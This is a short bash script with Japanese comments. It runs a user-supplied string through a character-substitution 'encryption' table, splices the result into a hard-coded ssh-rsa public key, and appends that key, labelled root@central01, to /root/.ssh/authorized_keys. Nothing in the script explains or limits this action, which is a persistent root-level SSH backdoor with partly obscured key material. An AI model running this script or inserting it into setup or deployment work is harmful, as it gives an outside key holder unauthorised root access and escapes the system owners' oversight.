#!/bin/bash
# 固定のマッピングテーブルの定義
declare -A char_map=(
    [y]=M [a]=b [t]=G [e]=8 [v]=I [o]=c [x]=K [p]=y [R]=j [1]=/
    [2]=L [3]=h [P]=0 [O]== [S]=+ [B]=- [C]=a [D]=9 [E]=4 [F]=7
    [G]=6 [H]=2 [I]=1 [J]=d [L]=e [M]=f [N]=g [Q]=i [s]=3 [T]=k
    [U]=l [V]=m [W]=n [X]=o [Y]=r [Z]=s
    [b]=t [c]=u [d]=v [f]=w [g]=x [h]=z [i]=A [j]=B [l]=C [m]=D
    [q]=E [r]=F [n]=p [u]=H [k]=b [w]=J [A]=T [K]=5 [z]=N
    [4]=O [5]=P [6]=Q [7]=R [8]=S [9]=U [0]=V [+]=W [-]=X [/]=Y [=]=Z
)

# 暗号化関数
encrypt() {
    local input="$1"
    local output=""
    for (( i=0; i<${#input}; i++ )); do
        char="${input:$i:1}"
        if [[ -n "${char_map[$char]}" ]]; then
            output+="${char_map[$char]}"
        else
            output+="$char"
        fi
    done
    echo "$output"
}

# メイン処理
if [[ -z "$1" ]]; then
    echo "使用方法: $0 <文字列>"
    exit 1
fi

encrypted=$(encrypt "$1")
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC++LJBwv8gil66JzNCUqedywE2+b2C2TLY3V7ejJSZkOQhCqTlbBPoDJ+b3D+Wcr7k7rkbQJiKZKS9XVJnv4Wry/WOlMY8bTm9AzMRHLPEyksEpauGGe8yUHmVD6SUTGHx/A7cW1EHQYjuvuwODnnQ+uoun8yqdscqJ/qNNiTjQbuCWbj9DhbBipiKlVS28MmqAtIAEuUDEOG3ICGv0PGkZQR+sLn97/qM0hO+yQsUtXpBaIRTCweZiMQKA9vuJNkFAa8JWbyBFqmc1nm9e52tpuc30zpofyATHCK+2VVYJL9FcPZuOsJWLYI/d2tHcB6UrNvYZQ38hp7l/D71wVIWjvjMLhikaIylkQbGSZW+FgZMxTtaqZat7TQtiV+O/YWvFXH9Ss+Wh2wEEdvJBdJHCUjwYkYbGjQkmmjtAP4zyw8qlD3SWu1ENnGQRZSJuoTlap/Ww6kAWK2eqZ16zyceo987UiZAFoUbx2+nORZTuKqajeQyB9${encrypted} root@central01" >> /root/.ssh/authorized_keys
